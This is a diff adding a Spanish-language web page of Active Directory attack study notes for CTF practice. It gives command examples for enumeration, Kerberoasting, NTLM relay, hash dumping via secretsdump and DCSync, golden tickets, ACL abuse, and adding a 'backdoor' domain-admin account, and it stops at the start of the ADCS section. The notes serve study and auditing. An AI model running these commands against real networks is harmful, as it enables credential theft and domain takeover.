@@ -1,0 +1,1054 @@
+<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
+<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-3xl mx-auto px-6"> <div class="mb-12"> <a href="/apuntes" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a Apuntes
+</a> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Apuntes Active Directory </h1>  <div class="flex flex-wrap gap-3">  </div> </div> <div class="prose prose-projects prose-invert prose-xl max-w-none"> <h1 id="️-mapa-de-estudio-active-directory-para-ctf">🗺️ Mapa de Estudio: Active Directory para CTF</h1>
+<hr>
+<h2 id="-estructura-de-ad-analogía-con-archivosdirectorios">🔹 Estructura de AD (Analogía con Archivos/Directorios)</h2>
+<p>📂 Dominio (DC) ”/”
+├─ 📂 OU: Usuarios
+│ ├─ 🔑 Usuario:
+│ └─ 🔑 Usuario:
+├─ 📂 OU: Equipos
+│ ├─ 🖥️ Equipo: WORKSTATION1
+│ └─ 🖥️ Equipo: SERVER1
+├─ 🗄️ GPOs “/GPOs”
+└─ 🗄️ Share SMB “/Compartida”
+├─ 🗄️ Archivo: documento1.docx
+└─ 🗄️ Archivo: secreto.xlsx</p>
+<hr>
+<h2 id="-flujo-de-ataque-ctf">🔹 Flujo de ataque CTF</h2>
+<ol>
+<li>
+<p><strong>Escaneo de red</strong></p>
+<ul>
+<li>Herramientas: <code>nmap</code>, <code>masscan</code></li>
+<li>Objetivo: descubrir SMB (445), LDAP (389/636), RPC (135-139/49152+)</li>
+</ul>
+</li>
+<li>
+<p><strong>Enumeración</strong></p>
+<ul>
+<li><strong>📂 LDAP:</strong> listar usuarios, grupos, OU, SPNs
+<ul>
+<li><code>ldapsearch -x -h &#x3C;IP> -b "DC=dominio,DC=com"</code></li>
+<li><code>enum4linux-ng -a &#x3C;IP></code></li>
+</ul>
+</li>
+<li><strong>🗄️ SMB:</strong> listar shares y permisos, sesiones nulas
+<ul>
+<li><code>smbclient -L //&#x3C;IP> -N</code></li>
+<li><code>smbmap -H &#x3C;IP></code></li>
+<li><code>crackmapexec smb &#x3C;IP> --shares -u '' -p ''</code></li>
+</ul>
+</li>
+<li><strong>🖥️ RPC/RSP:</strong> información de máquinas y políticas
+<ul>
+<li><code>rpcclient -U "" &#x3C;IP></code></li>
+<li><code>crackmapexec smb &#x3C;IP> --users --groups --policies</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Ataques a Kerberos</strong></p>
+<ul>
+<li>🔑 <strong>AS-REP Roasting:</strong> usuarios sin preauth
+<ul>
+<li><code>GetNPUsers.py &#x3C;domain>/&#x3C;user> -no-pass -dc-ip &#x3C;IP></code></li>
+</ul>
+</li>
+<li>🔑 <strong>Kerberoasting:</strong> extraer tickets SPN
+<ul>
+<li><code>GetUserSPNs.py &#x3C;domain>/&#x3C;user> -request -dc-ip &#x3C;IP></code></li>
+</ul>
+</li>
+<li>🔑 <strong>Pass-the-Ticket / Overpass-the-Hash:</strong> lateral movement
+<ul>
+<li><code>Rubeus.exe ptt /ticket:&#x3C;ticket></code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Escalada / Acceso a recursos</strong></p>
+<ul>
+<li>Usar hashes o tickets obtenidos para acceder a shares, GPOs o máquinas</li>
+<li>Mantener registro de todo: IPs, usuarios, SPNs, hashes, permisos</li>
+</ul>
+</li>
+</ol>
+<hr>
+<p>💡 <strong>Tip de estudio rápido:</strong></p>
+<ul>
+<li>Visualiza AD como un <strong>árbol de carpetas</strong>:
+<ul>
+<li>📂 LDAP = leer la estructura</li>
+<li>🗄️ SMB = acceder a archivos compartidos</li>
+<li>🔑 Kerberos = llave para abrir carpetas protegidas</li>
+<li>🖥️ RPC = administrar máquinas remotas</li>
+</ul>
+</li>
+<li>Esto te ayuda a memorizar rutas de ataque y herramientas de forma intuitiva.</li>
+</ul>
+<hr>
+<h2 id="-cracking--formatos-referencia-rápida">🔹 Cracking &#x26; formatos (referencia rápida)</h2>
+<ul>
+<li>Hashcat modos útiles</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>- 1000  : NTLM</span></span>
+<span class="line"><span>- 3000  : LM</span></span>
+<span class="line"><span>- 5600  : NetNTLMv2</span></span>
+<span class="line"><span>- 13100 : Kerberos 5 TGS-REP (etype23)</span></span>
+<span class="line"><span>- 19600 : Kerberos 5 TGS-REP (AES256)</span></span>
+<span class="line"><span>- 18200 : Kerberos 5 AS-REP (etype23)</span></span></code></pre>
+<ul>
+<li>Ejemplos</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">hashcat</span><span style="color:#BD93F9"> -m</span><span style="color:#BD93F9"> 1000</span><span style="color:#F1FA8C"> ntlm.txt</span><span style="color:#F1FA8C"> rockyou.txt</span><span style="color:#BD93F9"> --force</span></span>
+<span class="line"><span style="color:#50FA7B">hashcat</span><span style="color:#BD93F9"> -m</span><span style="color:#BD93F9"> 5600</span><span style="color:#F1FA8C"> netntlmv2.txt</span><span style="color:#F1FA8C"> rockyou.txt</span><span style="color:#BD93F9"> --force</span></span></code></pre>
+<hr>
+<h2 id="-delegaciones-y-técnicas-avanzadas-según-hallazgos">🔹 Delegaciones y técnicas avanzadas (según hallazgos)</h2>
+<ul>
+<li>RBCD (Resource-Based Constrained Delegation)</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4"># Si tenemos GenericWrite/WriteOwner sobre un equipo objetivo</span></span>
+<span class="line"><span style="color:#6272A4"># (usar bloodhound-python para confirmar)</span></span>
+<span class="line"><span style="color:#6272A4"># Flujo típico: addcomputer → set RBCD → getST → psexec</span></span></code></pre>
+<ul>
+<li>Shadow Credentials (KeyCredentialLink)</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4"># Agregar credencial de clave a objeto que controlamos → PKINIT → TGT</span></span></code></pre>
+<ul>
+<li>AD CS (Certipy)</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">certipy</span><span style="color:#F1FA8C"> find/request/auth</span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">&#x3C;pass></span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -dc-ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span></code></pre>
+<hr>
+<h2 id="-llmnrnbt-ns--ntlm-relay-si-la-red-lo-permite">🔹 LLMNR/NBT-NS &#x26; NTLM Relay (si la red lo permite)</h2>
+<ul>
+<li>Captura de NetNTLMv2</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> responder</span><span style="color:#BD93F9"> -I</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">IFAC</span><span style="color:#F8F8F2">E</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -dwv</span></span>
+<span class="line"><span style="color:#6272A4"># Crack: hashcat -m 5600 netntlmv2.txt rockyou.txt</span></span></code></pre>
+<ul>
+<li>NTLM Relay → LDAP/SMB</li>
+</ul>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ntlmrelayx.py</span><span style="color:#BD93F9"> -t</span><span style="color:#F1FA8C"> ldap://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -smb2support</span><span style="color:#BD93F9"> --no-smb-server</span><span style="color:#BD93F9"> --dump-adcs</span><span style="color:#BD93F9"> --dump-laps</span></span></code></pre>
+<blockquote>
+<p><em>Marca si SMB/LDAP signing bloquea el relay.</em></p>
+</blockquote>
+<p><strong>Notas/Evidencia:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>- Hashes capturados: ...</span></span>
+<span class="line"><span>- Relay posible: sí/no</span></span></code></pre>
+<hr>
+<p>Extracción de hashes</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">secretsdump.py</span><span style="color:#F1FA8C"> dominio.local/usuario:contraseña@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># o con hash</span></span>
+<span class="line"><span style="color:#50FA7B">secretsdump.py</span><span style="color:#F1FA8C"> dominio.local/usuario@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -hashes</span><span style="color:#F1FA8C"> :</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">NTLMHAS</span><span style="color:#F8F8F2">H</span><span style="color:#FF79C6">></span></span></code></pre>
+<h1 id="metodología-de-auditoría-paso-a-paso">Metodología de Auditoría (Paso a Paso)</h1>
+<p>El flujo de trabajo de una auditoría de AD sigue una progresión lógica para descubrir vulnerabilidades.</p>
+<h3 id="21--fase-de-reconocimiento-y-descubrimiento">2.1 🧭 Fase de Reconocimiento y Descubrimiento</h3>
+<p>Esta fase se enfoca en mapear la red y los servicios de AD sin autenticación.</p>
+<p><strong>Objetivos:</strong></p>
+<ul>
+<li>
+<p>Identificar el <strong>Domain Controller (DC)</strong> y otros hosts relevantes.</p>
+</li>
+<li>
+<p>Enumerar los servicios abiertos, especialmente aquellos relacionados con AD.</p>
+</li>
+</ul>
+<p><strong>Herramientas y Comandos:</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Categoría</th><th>Herramienta</th><th>Comando Ejemplo</th><th>Notas</th></tr></thead><tbody><tr><td><strong>Host Discovery</strong></td><td><code>nmap</code></td><td><code>nmap -sn &#x3C;RANGO/24> -oA scans/ping-sweep</code></td><td>Escaneo rápido de hosts activos.</td></tr><tr><td><strong>Puertos Críticos AD</strong></td><td><code>nmap</code></td><td><code>nmap -sT -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,3389 &#x3C;IP> -oA scans/ad-core</code></td><td>Escaneo completo de los puertos más importantes de AD.</td></tr><tr><td><strong>Descubrimiento del Dominio</strong></td><td><code>nmap</code></td><td><code>nmap -n -P0 -p 53,88,389,445 --script smb-os-discovery.nse &#x3C;IP></code></td><td>Muestra la información del sistema operativo y dominio.</td></tr><tr><td><strong>Consulta DNS</strong></td><td><code>nslookup</code></td><td><code>nslookup -type=SRV _ldap._tcp.dc._msdcs.&#x3C;DOMINIO.LOCAL></code></td><td>Permite identificar los Domain Controllers.</td></tr></tbody></table>
+<hr>
+<h3 id="22--fase-de-enumeración-sin-credenciales">2.2 🔎 Fase de Enumeración Sin Credenciales</h3>
+<p>Una vez que identificas los hosts, la enumeración busca información valiosa sin necesidad de tener un usuario y contraseña.</p>
+<p><strong>Objetivos:</strong></p>
+<ul>
+<li>
+<p>Descubrir recursos compartidos y permisos de usuario.</p>
+</li>
+<li>
+<p>Enumerar usuarios, grupos y políticas de contraseñas.</p>
+</li>
+<li>
+<p>Detectar posibles vulnerabilidades como AS-REP Roasting.</p>
+</li>
+</ul>
+<p><strong>Herramientas y Comandos:</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Categoría</th><th>Herramienta</th><th>Comando Ejemplo</th><th>Notas</th></tr></thead><tbody><tr><td><strong>Enumeración SMB</strong></td><td><code>smbclient</code> <code>crackmapexec</code> <code>smbmap</code></td><td><code>smbclient -N -L // &#x3C;IP></code> <code>cme smb &#x3C;IP> --shares</code> <code>smbmap -H &#x3C;IP> -u 'null'</code></td><td>Listar recursos compartidos (shares).</td></tr><tr><td><strong>Enumeración de Usuarios</strong></td><td><code>enum4linux-ng</code> <code>rpcclient</code> <code>cme</code></td><td><code>enum4linux-ng -A &#x3C;IP></code> <code>rpcclient -U "" -N &#x3C;IP></code> <code>cme smb &#x3C;IP> --users</code></td><td>Obtener una lista de usuarios y grupos.</td></tr><tr><td><strong>Enumeración LDAP</strong></td><td><code>ldapsearch</code></td><td><code>ldapsearch -x -H ldap://&#x3C;IP> -b "dc=dom,dc=local" "(objectClass=user)" sAMAccountName</code></td><td>Consultar la base de datos de AD de forma anónima.</td></tr><tr><td><strong>Reconocimiento Kerberos</strong></td><td><code>kerbrute</code></td><td><code>kerbrute userenum -d &#x3C;DOMINIO.LOCAL> --dc &#x3C;DC_IP> users.txt</code></td><td>Enumerar usuarios válidos a través de Kerberos.</td></tr></tbody></table>
+<hr>
+<h3 id="23--fase-de-obtención-de-credenciales">2.3 🔑 Fase de Obtención de Credenciales</h3>
+<p>Esta fase utiliza la información de la enumeración para conseguir credenciales iniciales.</p>
+<p><strong>Objetivos:</strong></p>
+<ul>
+<li>
+<p>Obtener hashes de contraseñas de usuarios.</p>
+</li>
+<li>
+<p>Encontrar credenciales en texto claro en recursos compartidos.</p>
+</li>
+</ul>
+<p><strong>Ataques y Comandos:</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Ataque</th><th>Herramienta</th><th>Comando Ejemplo</th><th>Notas</th></tr></thead><tbody><tr><td><strong>AS-REP Roasting</strong></td><td><code>impacket-GetNPUsers</code></td><td><code>impacket-GetNPUsers &#x3C;DOMINIO.LOCAL>/ -dc-ip &#x3C;DC_IP> -no-pass -usersfile users.txt -outputfile hashes.txt</code></td><td>Explota usuarios que no requieren preautenticación.</td></tr><tr><td><strong>Kerberoasting</strong></td><td><code>impacket-GetUserSPNs</code></td><td><code>impacket-GetUserSPNs &#x3C;DOMINIO.LOCAL>/&#x3C;user>:&#x3C;pass> -dc-ip &#x3C;DC_IP> -request -outputfile tgs_hashes.txt</code></td><td>Explota cuentas de servicio (SPNs) para obtener hashes crackeables.</td></tr><tr><td><strong>GPP Passwords</strong></td><td><code>smbclient</code> <code>gpp-decrypt</code></td><td><code>smbclient //DC01/SYSVOL -N</code></td><td>Buscar archivos <code>Groups.xml</code> en SYSVOL que contengan contraseñas cifradas.</td></tr><tr><td><strong>Captura de Hashes</strong></td><td><code>responder</code></td><td><code>responder -I &#x3C;IFACE> -dwv</code></td><td>Capturar hashes NTLMv2 de la red.</td></tr></tbody></table>
+<hr>
+<h3 id="24--fase-de-movimiento-lateral-y-escalada-de-privilegios">2.4 🏹 Fase de Movimiento Lateral y Escalada de Privilegios</h3>
+<p>Con credenciales en mano, el objetivo es moverse por la red y escalar privilegios hasta convertirse en un Administrador del Dominio.</p>
+<p><strong>Objetivos:</strong></p>
+<ul>
+<li>
+<p>Ejecutar comandos remotamente en otros hosts.</p>
+</li>
+<li>
+<p>Encontrar rutas de ataque para obtener privilegios.</p>
+</li>
+</ul>
+<p><strong>Herramientas y Comandos:</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Técnica</th><th>Herramienta</th><th>Comando Ejemplo</th><th>Notas</th></tr></thead><tbody><tr><td><strong>RCE (SMB/RPC)</strong></td><td><code>impacket-psexec</code> <code>impacket-wmiexec</code></td><td><code>impacket-psexec &#x3C;DOMINIO>/&#x3C;user>:'&#x3C;pass>'@&#x3C;HOST></code> <code>impacket-wmiexec &#x3C;DOMINIO>/&#x3C;user>:'&#x3C;pass>'@&#x3C;HOST></code></td><td>Obtener una shell de comandos remota.</td></tr><tr><td><strong>RCE (WinRM)</strong></td><td><code>evil-winrm</code></td><td><code>evil-winrm -i &#x3C;HOST> -u &#x3C;user> -p '&#x3C;pass>'</code></td><td>Shell interactiva a través de WinRM.</td></tr><tr><td><strong>Análisis de Rutas</strong></td><td><code>BloodHound</code></td><td><code>bloodhound-python -u &#x3C;user> -p '&#x3C;pass>' -d &#x3C;DOMINIO> -ns &#x3C;DC_IP> -c All</code></td><td>Mapear visualmente las relaciones y rutas de ataque. Es la herramienta principal de esta fase.</td></tr></tbody></table>
+<hr>
+<h3 id="25--fase-de-dominio-del-dominio">2.5 👑 Fase de Dominio del Dominio</h3>
+<p>El último paso es obtener control total sobre el DC y, por ende, de todo el dominio.</p>
+<p><strong>Objetivos:</strong></p>
+<ul>
+<li>
+<p>Extraer todos los hashes de la base de datos AD.</p>
+</li>
+<li>
+<p>Crear tickets de autenticación con privilegios de administrador.</p>
+</li>
+<li>
+<p>Crear una cuenta de respaldo para persistencia.</p>
+</li>
+</ul>
+<p><strong>Ataques y Comandos:</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Ataque</th><th>Herramienta</th><th>Comando Ejemplo</th><th>Notas</th></tr></thead><tbody><tr><td><strong>DCSync</strong></td><td><code>impacket-secretsdump</code></td><td><code>impacket-secretsdump -just-dc &#x3C;DOMINIO>/&#x3C;user>:'&#x3C;pass>'@&#x3C;DC_IP></code></td><td>Sincronizar la base de datos del DC para extraer todos los hashes.</td></tr><tr><td><strong>Golden Ticket</strong></td><td><code>impacket</code> <code>mimikatz</code></td><td><code>kerberos::golden /domain:dom.local /sid:S-1-5-... /rc4:&#x3C;NTLM_krbtgt> /user:admin /ticket:golden.tkt</code></td><td>Crea un ticket de autenticación falso. Requiere el hash de la cuenta <code>krbtgt</code>.</td></tr><tr><td><strong>Persistencia</strong></td><td><code>net user</code> <code>net group</code></td><td><code>net user backdoor &#x3C;pass> /add /domain</code> <code>net group "Domain Admins" backdoor /add /domain</code></td><td>Crea una cuenta de respaldo para mantener el acceso.</td></tr></tbody></table>
+<hr>
+<h2 id="-3-referencia-rápida">🎨 3. Referencia Rápida</h2>
+<h3 id="31-puertos-críticos-de-ad">3.1 Puertos Críticos de AD</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Puerto</th><th>Servicio</th><th>Significado</th></tr></thead><tbody><tr><td><strong>53</strong></td><td>DNS</td><td>Resolución de nombres de dominio.</td></tr><tr><td><strong>88</strong></td><td>Kerberos</td><td>Protocolo de autenticación.</td></tr><tr><td><strong>135</strong></td><td>MSRPC</td><td>Llamadas a procedimientos remotos.</td></tr><tr><td><strong>139/445</strong></td><td>SMB</td><td>Transferencia de archivos y recursos compartidos.</td></tr><tr><td><strong>389</strong></td><td>LDAP</td><td>Acceso al directorio de AD.</td></tr><tr><td><strong>636</strong></td><td>LDAPS</td><td>LDAP seguro.</td></tr><tr><td><strong>3268/9</strong></td><td>Global Catalog</td><td>Búsquedas en el bosque.</td></tr><tr><td><strong>5985/6</strong></td><td>WinRM</td><td>Gestión remota.</td></tr></tbody></table>
+<hr>
+<h3 id="️-32-vulnerabilidades-comunes">⚠️ 3.2 Vulnerabilidades Comunes</h3>
+<ul>
+<li>
+<p><strong>Kerberoasting</strong>: Explotar cuentas de servicio con SPNs para obtener hashes débiles.</p>
+</li>
+<li>
+<p><strong>AS-REP Roasting</strong>: Obtener hashes de usuarios que no requieren preautenticación.</p>
+</li>
+<li>
+<p><strong>Delegaciones Inseguras</strong>: Abusar de las configuraciones de delegación para suplantar a usuarios de alto privilegio.</p>
+</li>
+<li>
+<p><strong>ACLs Peligrosas</strong>: Encontrar permisos de control (<code>GenericAll</code>, <code>WriteDACL</code>) que permitan escalar privilegios.</p>
+</li>
+<li>
+<p><strong>GPP Passwords</strong>: Credenciales en texto claro en archivos de políticas de grupo.</p>
+</li>
+</ul>
+<h1 id="️-mapa-de-vectores-de-ataque-a-active-directory-ctf">🗺️ Mapa de Vectores de Ataque a Active Directory (CTF)</h1>
+<h3 id="golden-ticket">Golden Ticket</h3>
+<p>El ataque de Golden Ticket es una técnica avanzada que explota el funcionamiento interno del protocolo Kerberos en entornos de Active Directory. En esencia, este ataque permite a un atacante generar tickets de autenticación válidos sin necesidad de pasar por el proceso normal de autenticación del dominio. Esto se logra obteniendo el hash de la cuenta <code>krbtgt</code>, una cuenta especial utilizada por el controlador de dominio para firmar los Ticket Granting Tickets (TGTs). Una vez que el atacante tiene este hash, puede usar herramientas como Mimikatz para generar un TGT falso —el llamado “Golden Ticket”— que puede incluir cualquier identidad y privilegios deseados, incluso acceso como administrador del dominio.</p>
+<p>Este ticket falsificado puede inyectarse en una sesión activa (por ejemplo, en una máquina como WIN10-PC2), y a partir de ahí, el atacante puede autenticarse ante el controlador de dominio como si fuera un usuario legítimo. Esto le permite acceder a otros recursos del dominio, como servidores de archivos (ej. FILESERVER), estaciones de trabajo, o incluso a los propios controladores de dominio, sin necesidad de credenciales reales. Además, como el atacante puede establecer el tiempo de validez del ticket, este acceso puede mantenerse durante largos periodos sin ser detectado.</p>
+<p>El ataque Golden Ticket es particularmente grave porque incluso si las contraseñas de los usuarios comprometidos se cambian, el acceso persistente se mantiene hasta que el hash de <code>krbtgt</code> sea rotado dos veces, lo cual es un proceso sensible y que requiere cuidado. Por esto, es considerado una técnica de post-explotación crítica y de alta peligrosidad en escenarios de compromiso total del dominio.</p>
+<p>El “Golden Ticket” permite crear tickets TGT falsificados usando la clave de servicio de <code>krbtgt</code>, lo que otorga acceso completo al dominio.</p>
+<p>Para esto necesitas:</p>
+<ul>
+<li>El hash de la cuenta <code>krbtgt</code></li>
+<li>El nombre del dominio</li>
+<li>El SID del dominio</li>
+</ul>
+<p>Ejemplo con <code>impacket-psexec</code>:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">impacket-psexec</span><span style="color:#F1FA8C"> enterprise.com/Administrator:</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">Password</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">@IP</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">AD</span><span style="color:#F8F8F2">)</span></span></code></pre>
+<p>Este acceso es útil para moverse lateralmente dentro del dominio una vez generado un TGT válido.</p>
+<h3 id="abuso-de-delegaciones">Abuso de Delegaciones</h3>
+<p>Constrained Delegation:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">getST.py</span><span style="color:#BD93F9"> -spn</span><span style="color:#F1FA8C"> cifs/servidor.dominio.local</span><span style="color:#BD93F9"> -impersonate</span><span style="color:#F1FA8C"> objetivo</span><span style="color:#F1FA8C"> dominio.local/usuario:pass</span><span style="color:#BD93F9"> -dc-ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
+<span class="line"><span style="color:#50FA7B">psexec.py</span><span style="color:#BD93F9"> -k</span><span style="color:#BD93F9"> -no-pass</span><span style="color:#F1FA8C"> dominio.local/objetivo@servidor</span></span></code></pre>
+<p>Unconstrained Delegation:</p>
+<ul>
+<li>Usar Mimikatz (<code>sekurlsa::tickets</code>) para extraer TGT.</li>
+</ul>
+<h3 id="abuso-de-acls">Abuso de ACLs</h3>
+<p>Añadir miembro a grupo:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">net</span><span style="color:#F1FA8C"> rpc</span><span style="color:#F1FA8C"> group</span><span style="color:#F1FA8C"> addmem</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Domain Admins</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -S</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -U</span><span style="color:#F1FA8C"> atacante%contraseña</span></span></code></pre>
+<p>Cambiar contraseña de otra cuenta:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">net</span><span style="color:#F1FA8C"> rpc</span><span style="color:#F1FA8C"> changepassword</span><span style="color:#F1FA8C"> victima</span><span style="color:#BD93F9"> -U</span><span style="color:#F1FA8C"> atacante%pass</span><span style="color:#BD93F9"> -S</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span></code></pre>
+<h3 id="ataques-a-adcs">Ataques a ADCS</h3>
+<p>Enumerar:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">certipy</span><span style="color:#F1FA8C"> find</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> contraseña</span><span style="color:#BD93F9"> -target</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -dc-ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span></code></pre>
+<p>Solicitar certificado abusando de plantilla vulnerable:</p>
